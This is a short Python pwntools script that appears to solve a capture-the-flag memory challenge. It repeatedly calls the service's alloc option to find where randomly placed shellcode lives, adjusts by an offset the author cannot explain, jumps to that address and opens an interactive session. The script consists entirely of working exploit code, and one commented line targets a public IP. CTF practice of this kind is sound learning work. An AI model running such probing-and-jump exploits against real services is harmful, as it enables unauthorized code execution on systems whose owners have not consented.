#!/usr/bin/env python
from pwn import *

r = remote('172.17.0.2', 8888)
#r = remote('54.202.7.144', '6969')

def alloc(size):
    r.sendafter('[a]lloc, [j]ump : ', 'a')
    r.sendafter('sz? ', str(size))
    ret_msg = r.recvn(4)
    if ret_msg == 'free':
        r.sendafter('? ', 'y')
        return True
    else:
        return False

def jump(addr):
    r.sendafter('[a]lloc, [j]ump : ', 'j')
    r.sendafter('sz? ', str(addr))

size = 0
# first, add size 0x100000000000 each time
# after FAIL, add 0x10000000000 each time
# after FAIL, add 0x1000000000 each time
# ...
for i in range(11, 2, -1):
    for j in range(16):
        size += (1 << 4*i)
        print 'try malloc({})'.format(hex(size))
        if not alloc(size):
            size -= (1 << 4*i)
            break

# The random shellcode is 0x11000 bytes far from the deduced address
# I still don't know why Orz
size += 0x11000
print 'the shellcode is located at: {}'.format(hex(size))

jump(size)

r.interactive()
